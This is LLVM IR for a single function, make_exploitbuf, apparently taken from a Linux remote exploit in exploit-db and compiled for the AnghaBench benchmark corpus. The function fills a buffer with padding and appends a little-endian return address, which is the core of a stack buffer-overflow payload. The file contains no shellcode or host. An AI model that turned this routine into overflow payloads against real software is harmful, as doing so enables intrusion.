; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_58.c_make_exploitbuf.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_58.c_make_exploitbuf.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SIZ = common dso_local global i64 0, align 8
@LEN = common dso_local global i64 0, align 8
@bufLenAdjust = common dso_local global i64 0, align 8
@retAddr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"_\01\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @make_exploitbuf(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %4 = load i8*, i8** %2, align 8
  %5 = load i64, i64* @SIZ, align 8
  %6 = sub nsw i64 %5, 1
  %7 = call i32 @memset(i8* %4, i8 signext 0, i64 %6)
  %8 = load i8*, i8** %2, align 8
  %9 = load i64, i64* @LEN, align 8
  %10 = load i64, i64* @bufLenAdjust, align 8
  %11 = add nsw i64 %9, %10
  %12 = call i32 @memset(i8* %8, i8 signext 97, i64 %11)
  %13 = load i8*, i8** %2, align 8
  %14 = call i32 @strlen(i8* %13)
  store i32 %14, i32* %3, align 4
  %15 = load i32, i32* @retAddr, align 4
  %16 = and i32 %15, 255
  %17 = trunc i32 %16 to i8
  %18 = load i8*, i8** %2, align 8
  %19 = load i32, i32* %3, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  store i8 %17, i8* %21, align 1
  %22 = load i32, i32* @retAddr, align 4
  %23 = and i32 %22, 65280
  %24 = ashr i32 %23, 8
  %25 = trunc i32 %24 to i8
  %26 = load i8*, i8** %2, align 8
  %27 = load i32, i32* %3, align 4
  %28 = add nsw i32 %27, 1
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  store i8 %25, i8* %30, align 1
  %31 = load i32, i32* @retAddr, align 4
  %32 = and i32 %31, 16711680
  %33 = ashr i32 %32, 16
  %34 = trunc i32 %33 to i8
  %35 = load i8*, i8** %2, align 8
  %36 = load i32, i32* %3, align 4
  %37 = add nsw i32 %36, 2
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %35, i64 %38
  store i8 %34, i8* %39, align 1
  %40 = load i32, i32* @retAddr, align 4
  %41 = and i32 %40, -16777216
  %42 = lshr i32 %41, 24
  %43 = trunc i32 %42 to i8
  %44 = load i8*, i8** %2, align 8
  %45 = load i32, i32* %3, align 4
  %46 = add nsw i32 %45, 3
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %44, i64 %47
  store i8 %43, i8* %48, align 1
  %49 = load i8*, i8** %2, align 8
  %50 = call i32 @strcat(i8* %49, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  ret void
}

declare dso_local i32 @memset(i8*, i8 signext, i64) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
